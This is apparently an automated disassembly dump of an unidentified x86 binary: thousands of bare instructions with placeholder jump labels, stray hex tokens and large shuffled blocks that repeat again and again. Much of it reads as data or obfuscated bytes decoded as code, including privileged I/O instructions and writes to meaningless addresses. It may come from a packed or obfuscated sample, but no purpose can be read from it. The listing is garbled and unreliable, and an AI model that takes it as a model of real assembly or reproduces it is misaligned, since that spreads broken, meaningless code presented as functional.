test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
pop edx
pop edx
jae r-xdata
je 0xffffffffa3a4e387
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_4043ab
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
call sub_403e71
xor edi 0x517f5859
jno 0xfffffffff2c1992e
push ecx
push ebx
call sub_403dc1
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
push ebp
pushfd
call sub_40401a
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jge r-xdata
mov [ fs : edi - 0x21 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff94a34
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_40403d
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
pushfd
push esi
call sub_404011
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_40412b
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
pop eax
jge r-xdata
jge 0xffffffffffa2c2c6
jne r-xdata
or edx 0xf3812e79
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x754905f0
jg r-xdata
ja 0xcac3ec
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf45081f
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf4904f6
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bc293
jae r-xdata
add edx 0xff108f0f
pop ecx
jns r-xdata
jno 0xffffffff874f7579
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc17e00
pop edx
jge r-xdata
jo 0xffffffff854f9ae5
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f4505ab
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffd12ea
jae r-xdata
call sub_4041a2
jb 0xffffffff81b2be58
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
ja r-xdata
pop edx
mov eax 0xff55870f
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fb606
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0c629
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
ja r-xdata
xor ebx 0xff3d870f
call sub_403f8d
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd522d
add esp 0x4
jae r-xdata
jl 0xf3c36e
jae r-xdata
jmp 0xffffffffff79c0d4
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_404048
jae 0xffffffffff43c86d
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f9a67
jg r-xdata
add eax 0x5abb2979
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe8919504
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158c5c8
push edi
call sub_40429a
jg 0xfffffffff0b39cc1
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133d144
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637bd
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c97
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff8428bae3
jae r-xdata
call 0xffffffff854f9cd1
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df72
jo 0xffffffffa2c15185
push ecx
push edx
call sub_40426a
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c175c7
push edx
call sub_404206
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404281
jo 0xff9b86e
jo 0xffffffff894f9cab
jae r-xdata
je 0xffffffffff6dc6b5
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_404244
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4042ea
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53c7f5
push esp
pushfd
push ecx
sub esp 0xc
call sub_404267
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_403dc1
jns r-xdata
jns r-xdata
xor esi 0x58b93d7f
jno r-xdata
push ebp
call sub_403d46
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jae r-xdata
jno 0x7398982d
jg r-xdata
jne 0x24c14e11
jae r-xdata
sub ecx 0xe1813e75
pop eax
jae r-xdata
add eax 0xf9b7159
test [ edx + 0xf ] ebx
and [ edi + edi * 8 ] 0x15ffffff
or [ 0xffffffffff6d830f ] 0xfe9ffff
mov [ edx - 0x7f000000 ] ecx
iretd
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jns r-xdata
jge 0xffffffffb8afbd48
pushfd
call sub_403d31
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_403dd1
ja 0x504c1d8
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
ja r-xdata
and ebx 0xcf812475
jno r-xdata
pop ecx
or eax 0xf04c483
mov ebp ebp
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
jae r-xdata
pop ecx
jno r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
pop edx
jg r-xdata
jpo 0xf70b6ae
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
je 0xffffffffa3a4e387
jg r-xdata
jg 0xffffffff9c9491bc
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf4501e8
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
ja r-xdata
and ecx 0xf681ad79
jns r-xdata
jmp 0xcac6f1
call sub_403e71
xor edi 0x517f5859
jno 0xfffffffff2c1992e
push ecx
push ebx
call sub_403dc1
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
push esi
push esi
call sub_403ebc
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd97b3
push edx
call sub_403df2
or edi 0x830f5858
jne r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jno 0x16402b8b
jae r-xdata
je 0xffffffff814fdf87
jne r-xdata
jno 0xffffffff834f95b5
xor edx 0x81257159
r-xdata
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac146e1
sub_403dd1
pop eax
pop edx
pop eax
jae r-xdata
pop edx
pop eax
jae r-xdata
or eax 0xff6d830f
pop eax
pop ecx
jge r-xdata
jne 0xf4501e8
pop ecx
or eax 0xf04c483
mov ebp ebp
add [ eax + eax - 0x7af10000 ] 0xea810971
jg r-xdata
jne 0x24c14e11
jno r-xdata
push ebp
call sub_403d46
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jne r-xdata
and eax 0x8b0f327f
jae r-xdata
sub ecx 0xe1813e75
pushfd
call sub_403d31
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_403dd1
ja 0x504c1d8
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jns r-xdata
jge 0xffffffffb8afbd48
jae r-xdata
pop ecx
jno r-xdata
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
ja r-xdata
and ecx 0xf681ad79
jns r-xdata
jmp 0xcac6f1
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
jno 0x16402b8b
pop edx
jg r-xdata
jpo 0xf70b6ae
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jns r-xdata
xor edx 0x81257159
r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
jae r-xdata
je 0xffffffff814fdf87
jne r-xdata
jno 0xffffffff834f95b5
jg r-xdata
jg 0xffffffff9c9491bc
ja r-xdata
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac146e1
push esi
push esi
call sub_403ebc
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd97b3
push edx
call sub_403df2
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jns r-xdata
jae r-xdata
je 0xffffffffa3a4e387
call sub_403e71
xor edi 0x517f5859
jno 0xfffffffff2c1992e
push ecx
push ebx
call sub_403dc1
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
sub_403df2
jg r-xdata
pop eax
add esp 0x4
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
pop ecx
jno r-xdata
jno 0x16402b8b
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcac6f1
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jns r-xdata
xor edx 0x81257159
r-xdata
pop edx
jg r-xdata
jpo 0xf70b6ae
jae r-xdata
sub eax 0x4d795a58
jae r-xdata
je 0xffffffff814fdf87
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf4501e8
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
jg 0xffffffff9c9491bc
ja r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
push esi
push esi
call sub_403ebc
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd97b3
push edx
call sub_403df2
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jne r-xdata
jno 0xffffffff834f95b5
push ebp
call sub_403d46
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4e387
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac146e1
jg r-xdata
jne 0x24c14e11
jae r-xdata
sub ecx 0xe1813e75
call sub_403e71
xor edi 0x517f5859
jno 0xfffffffff2c1992e
push ecx
push ebx
call sub_403dc1
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8afbd48
pushfd
call sub_403d31
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_403dd1
ja 0x504c1d8
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jno r-xdata
pop ecx
jae r-xdata
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub_403e3d
pop eax
pop ecx
pop ecx
jae r-xdata
pop eax
pop eax
jae r-xdata
or edx 0xff50830f
pop ecx
pop eax
jg r-xdata
mov ebx 0x8f0f6975
pop edx
jne r-xdata
jno 0xfffffffff2c1992e
push ecx
push ebx
call sub_403dc1
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
pushfd
push ebx
push esp
pushfd
add esi 0xf337d58
test [ edi - 0x5b ] bh
pop ecx
jno r-xdata
jno 0x16402b8b
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jns r-xdata
jmp 0xcac6f1
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
pop edx
jg r-xdata
jpo 0xf70b6ae
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jae r-xdata
sub eax 0x4d795a58
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf4501e8
jns r-xdata
xor edx 0x81257159
r-xdata
call sub_403e71
xor edi 0x517f5859
push edi
push ebp
push ecx
and ecx 0xff378f0f
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
jae r-xdata
je 0xffffffff814fdf87
jne r-xdata
jno 0xffffffff834f95b5
push ebp
call sub_403d46
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jg r-xdata
jg 0xffffffff9c9491bc
ja r-xdata
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac146e1
jg r-xdata
jne 0x24c14e11
jae r-xdata
sub ecx 0xe1813e75
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd97b3
push edx
call sub_403df2
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8afbd48
pushfd
call sub_403d31
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_403dd1
ja 0x504c1d8
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4e387
jno r-xdata
pop ecx
jae r-xdata
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
push esi
push esi
call sub_403ebc
sub ebx 0xfeace855
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
sub_403e71
pushfd
jae r-xdata
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
pop ecx
jno r-xdata
jno 0x16402b8b
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcac6f1
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jns r-xdata
xor edx 0x81257159
r-xdata
pop edx
jg r-xdata
jpo 0xf70b6ae
jae r-xdata
sub eax 0x4d795a58
jae r-xdata
je 0xffffffff814fdf87
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf4501e8
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
jg 0xffffffff9c9491bc
ja r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
push esi
push esi
call sub_403ebc
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd97b3
push edx
call sub_403df2
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jne r-xdata
jno 0xffffffff834f95b5
push ebp
call sub_403d46
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4e387
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac146e1
jg r-xdata
jne 0x24c14e11
jae r-xdata
sub ecx 0xe1813e75
call sub_403e71
xor edi 0x517f5859
jno 0xfffffffff2c1992e
push ecx
push ebx
call sub_403dc1
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8afbd48
push edi
push eax
push edx
call sub_403dd1
ja 0x504c1d8
pushfd
call sub_403d31
mov eax [ fs : 0xffffffff9ce8c173 ]
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jno r-xdata
pop ecx
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
sub_403ebc
sub [ esp + 0x40 ] r-xdata
sub esp 0x10
pop edx
ja r-xdata
jg r-xdata
jmp [ 0xce8d0f ]
jge r-xdata
jmp 0xffffffff844f7072
jno r-xdata
sub esi 0x73bd047f
push ebp
ja r-xdata
jmp [ 0xfffffffff381df77 ]
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1fda1
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
ja r-xdata
call 0xffcb8b0
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1bedb
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a47c77
jge r-xdata
call [ 0xffffffffca81677d ]
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
pop edx
pop edx
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3c712
ja r-xdata
jge 0x71fc7f19
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
push ebp
pushfd
call sub_40401a
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jno r-xdata
mov ebx 0xf04c483
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jne r-xdata
or edx 0xf3812e79
pushfd
push esi
call sub_404011
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_40412b
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
pop eax
jge r-xdata
jge 0xffffffffffa2c2c6
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jno r-xdata
sub esi 0x89641f79
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc17e00
jae r-xdata
add edx 0xff108f0f
pop ecx
jns r-xdata
jno 0xffffffff874f7579
jne r-xdata
sub edi 0x64244481
mov bh 0x46
inc eax
add [ ebx + 0x5a5928ec ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacd03e
jae r-xdata
ja 0xffffffffa3c34fd6
push ecx
push edx
push ebp
sub esp 0x4
call sub_403fdd
xor ebx 0x15ff4e7f
mov edx 0xff47830f
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
ja r-xdata
pop edx
mov eax 0xff55870f
jg r-xdata
jpo 0xdec5bc
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
ja r-xdata
xor ebx 0xff3d870f
call sub_403f8d
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_4043ab
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
jmp 0xffffffffff79c0d4
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff94a34
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_40403d
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jg r-xdata
add eax 0x5abb2979
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x754905f0
jg r-xdata
ja 0xcac3ec
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf45081f
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf4904f6
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bc293
pop edx
jge r-xdata
jo 0xffffffff854f9ae5
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f4505ab
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffd12ea
jae r-xdata
call sub_4041a2
jb 0xffffffff81b2be58
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fb606
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0c629
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd522d
add esp 0x4
jae r-xdata
jl 0xf3c36e
pop ecx
jno r-xdata
